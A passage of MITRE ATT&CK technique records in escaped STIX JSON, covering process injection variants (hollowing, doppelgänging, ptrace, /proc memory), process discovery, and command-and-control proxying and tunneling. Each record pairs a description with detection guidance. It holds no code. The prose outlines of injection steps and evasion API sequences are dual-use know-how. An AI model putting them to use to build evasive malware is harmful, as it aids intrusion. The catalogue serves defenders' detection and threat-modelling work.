\",\"external_references\":[{\"external_id\":\"T1055.009\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055/009\"},{\"description\":\"skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.\",\"source_name\":\"Uninformed Needle\",\"url\":\"http://hick.org/code/skape/papers/needle.txt\"},{\"description\":\"McNamara, R. (2017, September 5). Linux Based Inter-Process Code Injection Without Ptrace(2). Retrieved February 21, 2020.\",\"source_name\":\"GDS Linux Injection\",\"url\":\"https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html\"},{\"description\":\"Kerrisk, M. (2020, February 2). DD(1) User Commands. Retrieved February 21, 2020.\",\"source_name\":\"DD Man\",\"url\":\"http://man7.org/linux/man-pages/man1/dd.1.html\"}],\"id\":\"attack-pattern--d201d4cc-214d-4a74-a1ba-b3fa09fd4591\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:25:55.331Z\",\"name\":\"Proc Memory\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\"],\"x_mitre_defense_bypassed\":[\"Application control\",\"Anti-virus\"],\"x_mitre_detection\":\"File system monitoring can determine if /proc files are being modified. Users should not have permission to modify these in most cases. \\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:48.728Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.\",\"external_references\":[{\"external_id\":\"T1057\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1057\"},{\"external_id\":\"CAPEC-573\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/573.html\"}],\"id\":\"attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T18:05:53.130Z\",\"name\":\"Process Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_system_requirements\":[\"Administrator, SYSTEM may provide better process ownership details\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1186\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1186\"},{\"description\":\"Microsoft. (n.d.). Transactional NTFS (TxF). Retrieved December 20, 2017.\",\"source_name\":\"Microsoft TxF\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/bb968806.aspx\"},{\"description\":\"Microsoft. (n.d.). Basic TxF Concepts. Retrieved December 20, 2017.\",\"source_name\":\"Microsoft Basic TxF Concepts\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/dd979526.aspx\"},{\"description\":\"Microsoft. (n.d.). When to Use Transactional NTFS. Retrieved December 20, 2017.\",\"source_name\":\"Microsoft Where to use TxF\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/aa365738.aspx\"},{\"description\":\"Liberman, T. & Kogan, E. (2017, December 7). Lost in Transaction: Process Doppelgänging. Retrieved December 20, 2017.\",\"source_name\":\"BlackHat Process Doppelgänging Dec 2017\",\"url\":\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\"},{\"description\":\"hasherezade. (2017, December 18). Process Doppelgänging – a new way to impersonate a process. Retrieved December 20, 2017.\",\"source_name\":\"hasherezade Process Doppelgänging Dec 2017\",\"url\":\"https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/\"},{\"description\":\"Microsoft. (n.d.). PsSetCreateProcessNotifyRoutine routine. Retrieved December 20, 2017.\",\"source_name\":\"Microsoft PsSetCreateProcessNotifyRoutine routine\",\"url\":\"https://msdn.microsoft.com/library/windows/hardware/ff559951.aspx\"}],\"id\":\"attack-pattern--c1a452f3-6499-4c12-b7e9-a6a0a102af76\",\"modified\":\"2020-01-14T17:23:25.111Z\",\"name\":\"Process Doppelgänging\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-14T17:19:50.978Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. \\n\\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\\n\\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)\\n\\nAdversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging\'s use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging Dec 2017)\\n\\nProcess Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):\\n\\n* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\\n* Load – Create a shared section of memory and load the malicious executable.\\n* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.\\n* Animate – Create a process from the tainted section of memory and initiate execution.\\n\\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process. \",\"external_references\":[{\"external_id\":\"T1055.013\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055/013\"},{\"description\":\"Microsoft. (n.d.). Transactional NTFS (TxF). Retrieved December 20, 2017.\",\"source_name\":\"Microsoft TxF\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/bb968806.aspx\"},{\"description\":\"Microsoft. (n.d.). Basic TxF Concepts. Retrieved December 20, 2017.\",\"source_name\":\"Microsoft Basic TxF Concepts\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/dd979526.aspx\"},{\"description\":\"Microsoft. (n.d.). When to Use Transactional NTFS. Retrieved December 20, 2017.\",\"source_name\":\"Microsoft Where to use TxF\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/aa365738.aspx\"},{\"description\":\"Liberman, T. & Kogan, E. (2017, December 7). Lost in Transaction: Process Doppelgänging. Retrieved December 20, 2017.\",\"source_name\":\"BlackHat Process Doppelgänging Dec 2017\",\"url\":\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\"},{\"description\":\"hasherezade. (2017, December 18). Process Doppelgänging – a new way to impersonate a process. Retrieved December 20, 2017.\",\"source_name\":\"hasherezade Process Doppelgänging Dec 2017\",\"url\":\"https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/\"},{\"description\":\"Microsoft. (n.d.). PsSetCreateProcessNotifyRoutine routine. Retrieved December 20, 2017.\",\"source_name\":\"Microsoft PsSetCreateProcessNotifyRoutine routine\",\"url\":\"https://msdn.microsoft.com/library/windows/hardware/ff559951.aspx\"}],\"id\":\"attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:27:21.304Z\",\"name\":\"Process Doppelgänging\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Application control\"],\"x_mitre_detection\":\"Monitor and analyze calls to <code>CreateTransaction</code>, <code>CreateFileTransacted</code>, <code>RollbackTransaction</code>, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to <code>NtCreateProcessEx</code> and <code>NtCreateThreadEx</code> as well as API calls used to modify memory within another process, such as <code>WriteProcessMemory</code>. (Citation: BlackHat Process Doppelgänging Dec 2017) (Citation: hasherezade Process Doppelgänging Dec 2017)\\n\\nScan file objects reported during the PsSetCreateProcessNotifyRoutine, (Citation: Microsoft PsSetCreateProcessNotifyRoutine routine) which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. (Citation: BlackHat Process Doppelgänging Dec 2017) Also consider comparing file objects loaded in memory to the corresponding file on disk. (Citation: hasherezade Process Doppelgänging Dec 2017)\\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:09.815Z\",\"external_references\":[{\"external_id\":\"T1093\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1093\"},{\"description\":\"Leitch, J. (n.d.). Process Hollowing. Retrieved November 12, 2014.\",\"source_name\":\"Leitch Hollowing\",\"url\":\"http://www.autosectools.com/process-hollowing.pdf\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"}],\"id\":\"attack-pattern--1c338d0f-a65e-4073-a5c1-c06878849f21\",\"modified\":\"2020-01-14T17:24:47.386Z\",\"name\":\"Process Hollowing\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-14T17:21:54.470Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \\n\\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Endgame Process Injection July 2017)\\n\\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. \",\"external_references\":[{\"external_id\":\"T1055.012\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055/012\"},{\"description\":\"Leitch, J. (n.d.). Process Hollowing. Retrieved November 12, 2014.\",\"source_name\":\"Leitch Hollowing\",\"url\":\"http://www.autosectools.com/process-hollowing.pdf\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"}],\"id\":\"attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:28:08.758Z\",\"name\":\"Process Hollowing\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Application control\",\"Anti-virus\"],\"x_mitre_detection\":\"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:47.843Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \\n\\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \\n\\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. \",\"external_references\":[{\"external_id\":\"T1055\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055\"},{\"external_id\":\"CAPEC-640\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/640.html\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.\",\"source_name\":\"ArtOfMemoryForensics\"},{\"description\":\"GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.\",\"source_name\":\"GNU Acct\",\"url\":\"https://www.gnu.org/software/acct/\"},{\"description\":\"Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.\",\"source_name\":\"RHEL auditd\",\"url\":\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing\"},{\"description\":\"stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.\",\"source_name\":\"Chokepoint preload rootkits\",\"url\":\"http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html\"},{\"description\":\"Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved December 13, 2017.\",\"source_name\":\"Microsoft Sysmon v6 May 2017\",\"url\":\"https://docs.microsoft.com/sysinternals/downloads/sysmon\"}],\"id\":\"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:28:45.651Z\",\"name\":\"Process Injection\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Anastasios Pingios\",\"Christiaan Beek, @ChristiaanBeek\",\"Ryan Becwar\"],\"x_mitre_data_sources\":[\"API monitoring\",\"File monitoring\",\"DLL monitoring\",\"Process monitoring\",\"Named Pipes\"],\"x_mitre_defense_bypassed\":[\"Application control\",\"Anti-virus\"],\"x_mitre_detection\":\"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Endgame Process Injection July 2017) \\n\\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \\n\\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \\n\\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) \\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-03-15T00:40:27.503Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \\n\\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. \",\"external_references\":[{\"external_id\":\"T1001.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1001/003\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-15T00:40:27.503Z\",\"name\":\"Protocol Impersonation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Process use of network\",\"Process monitoring\",\"Network protocol analysis\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-15T16:03:39.082Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \\n\\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \\n\\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \\n\\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. \",\"external_references\":[{\"external_id\":\"T1572\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1572\"},{\"description\":\"SSH.COM. (n.d.). SSH tunnel. Retrieved March 15, 2020.\",\"source_name\":\"SSH Tunneling\",\"url\":\"https://www.ssh.com/ssh/tunneling\"},{\"description\":\"Gatlan, S. (2019, July 3). New Godlua Malware Evades Traffic Monitoring via DNS over HTTPS. Retrieved March 15, 2020.\",\"source_name\":\"BleepingComp Godlua JUL19\",\"url\":\"https://www.bleepingcomputer.com/news/security/new-godlua-malware-evades-traffic-monitoring-via-dns-over-https/\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-27T17:15:35.372Z\",\"name\":\"Protocol Tunneling\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Network protocol analysis\",\"Process monitoring\",\"Process use of network\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"Monitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. \\n\\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:08.479Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\\n\\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.\",\"external_references\":[{\"external_id\":\"T1090\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1090\"},{\"description\":\"Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.\",\"source_name\":\"Trend Micro APT Attack Tools\",\"url\":\"http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-06-20T20:53:20.670Z\",\"name\":\"Proxy\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Brian Prange\",\"Heather Linn\",\"Walker Johnson\"],\"x_mitre_data_sources\":[\"SSL/TLS inspection\",\"Process use of network\",\"Process monitoring\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\\n\\nConsider monitoring for traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"3.0\"}",
    "{\"created\":\"2020-01-14T01:33:19.065Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \\n\\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) \\n\\nPtrace system call injection may not be possible targeting processes with high-privileges, and on some system those that are non-child processes.(Citation: BH Linux Inject) \\n\\nRunning code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. \",\"external_references\":[{\"external_id\":\"T1055.008\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055/008\"},{\"description\":\"Kerrisk, M. (2020, February 9). PTRACE(2) - Linux Programmer\'s Manual. Retrieved February 21, 2020.\",\"source_name\":\"PTRACE man\",\"url\":\"http://man7.org/linux/man-pages/man2/ptrace.2.html\"},{\"description\":\"Jain, S. (2018, July 25). Code 